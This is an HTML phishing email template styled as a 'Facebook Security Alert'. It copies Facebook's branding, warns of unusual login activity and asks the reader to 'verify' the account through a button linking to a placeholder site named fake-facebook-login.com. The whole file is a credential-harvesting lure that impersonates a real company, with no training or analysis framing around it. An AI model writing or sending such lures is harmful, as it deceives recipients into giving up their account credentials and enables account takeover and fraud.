<!DOCTYPE html>
<html>
<head>
    <title>Facebook Security Alert</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .header { background: #4267B2; color: white; padding: 10px; text-align: center; }
        .content { padding: 20px; }
        .button { background: #1877f2; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Facebook Security Alert</h1>
    </div>
    <div class="content">
        <p>Hello User,</p>
        <p>We detected unusual login activity on your account. For your security, please verify your account by clicking the button below:</p>
        <a href="http://fake-facebook-login.com" class="button">Verify Account</a>
        <p>If you did not request this, please secure your account immediately.</p>
        <p>Thanks,<br>Facebook Security Team</p>
    </div>
</body>
</html>
